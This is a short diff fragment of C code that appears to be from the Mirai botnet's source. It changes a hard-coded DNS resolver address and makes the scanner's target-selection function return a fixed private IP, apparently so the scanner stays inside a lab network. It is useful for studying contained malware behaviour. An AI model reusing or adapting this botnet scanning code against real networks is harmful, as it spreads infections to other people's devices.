@@ -76,7 +76,7 @@ index ea1f62d..209cfd6 100755
      util_zero(&addr, sizeof (struct sockaddr_in));
      addr.sin_family = AF_INET;
 -    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
-+    addr.sin_addr.s_addr = INET_ADDR(172,16,237,139);
++    addr.sin_addr.s_addr = INET_ADDR(172,31,18,193);
      addr.sin_port = htons(53);
  
      // Set up the dns query
@@ -137,7 +137,7 @@ index 615aa93..d5170db 100755
 +    //       (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
 +    // );
 +
-+    return INET_ADDR(172,16,237,234);
++    return INET_ADDR(172,31,20,32);
  }
  
  static int consume_iacs(struct scanner_connection *conn)
